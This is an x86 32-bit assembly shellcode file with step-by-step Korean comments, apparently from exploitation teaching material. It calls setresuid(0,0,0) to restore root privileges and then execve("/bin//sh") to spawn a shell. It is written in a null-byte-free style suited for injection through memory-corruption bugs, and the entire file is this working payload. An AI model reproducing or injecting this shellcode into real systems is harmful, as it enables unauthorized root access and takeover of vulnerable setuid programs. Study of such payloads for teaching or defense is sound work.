BITS 32
  
; setresuid(uid_t ruid, uid_t euid, uid_t suid);
xor eax, eax    ; EAX 레지스터의 값을 0으로 만듭니다.
xor ebx, ebx    ; EBX 레지스터의 값을 0으로 만듭니다.
xor ecx, ecx    ; ECX 레지스터의 값를 0으로 만듭니다.
cdq             ; EAX 레지스터에 저장된 값의 부호 비트(Sign Flag)를 가져와 EDX 레지스터의 값을 0으로 만듭니다.
				; execve() 함수의 3번째 인자(EDX)로 Null을 저장합니다.
mov al, 0xa4    ; setresuid() 시스템 함수의 콜 번호 164(0xa4)를 AL 레지스터에 저장합니다.
int 0x80        ; setresuid(0, 0, 0) 프로세스의 루트 권한 복구

; execve(const char *filename, char *const argv [], char *const envp[])
push BYTE 11    ; execve() 시스템 함수의 콜 번호 11을 Stack에 저장합니다.
pop eax         ; Stack에 저장된 11(더블워드)를 EAX 레지스터에 저장합니다.
push ecx        ; 문자열의 끝을 알리기 위해 Null을 먼저 Stack에 저장합니다.
push 0x68732f2f ; 문자 "//sh"를 스택에 저장합니다.
push 0x6e69622f ; 문자 "/bin"를 스택에 저장합니다.
mov ebx, esp    ; execve() 함수의 1번째 인자(EBX)로 "/bin//sh"의 주소(ESP)를 저장합니다.

; 2번째 인자를 위한 문자열 포인터 생성 및 3번째 인자 값 설정
mov ecx, edx    ; execve() 함수의 2번째 인자(ECX)로 Null을 저장합니다.
int 0x80        ; execve("/bin//sh",NULL,NULL)
